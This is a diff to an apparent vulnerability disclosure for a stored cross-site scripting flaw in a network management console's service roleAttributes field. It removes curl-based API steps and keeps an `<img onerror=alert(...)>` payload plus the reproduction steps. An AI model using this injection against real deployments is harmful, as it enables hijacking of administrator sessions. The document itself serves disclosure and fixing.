@@ -63,49 +63,19 @@ The vulnerability is triggered when a previously stored malicious role attribute
 ### Step 1 – Login as Administrator
 Navigate to the login page and log in using admin credentials.
 
-### Step 2 – Authenticate via API
-Obtain a session token:
 
-```bash
-TOKEN=$(curl -sk -X POST "https://<target>/edge/management/v1/authenticate?method=password" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"<password>"}' \
-  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])")
-```
-
-### Step 3 – Create a Service with Malicious Role Attribute
+### Step 2 – Create a Service with Malicious Role Attribute
 Inject the following payload into the roleAttributes field:
 
 Payload: `<img src=1 onerror=alert(document.domain)>`
 
-```bash
-curl -sk -X POST "https://<target>/edge/management/v1/services" \
-  -H "Zt-Session: $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "name": "XSS-Demo-Service",
-    "terminatorStrategy": "",
-    "roleAttributes": ["<img src=1 onerror=alert(document.domain)>"],
-    "encryptionRequired": true,
-    "configs": []
-  }'
-```
-
-The API returns HTTP 201 Created. No input validation is performed.
-
-### Step 4 – Persistence of Payload
+### Step 3 – Persistence of Payload
 The application stores the malicious roleAttributes value in the database without sanitization.
 
-Verify via GET request:
+Verify via GET: `/edge/management/v1/service-role-attributes?limit=100&offset=0&sort=name%20asc`
 
-```bash
-curl -sk "https://<target>/edge/management/v1/services?sort=createdAt%20desc" \
-  -H "Zt-Session: $TOKEN" -H "Accept: application/json"
-```
 
-The role attribute is returned exactly as injected, with `<` and `>` characters preserved.
-
-### Step 5 – Trigger the Stored XSS
+### Step 4 – Trigger the Stored XSS
 Navigate to the Services list page.
 
 The `alert(document.domain)` dialog appears, showing the target domain "ziti.local", confirming the Stored XSS.
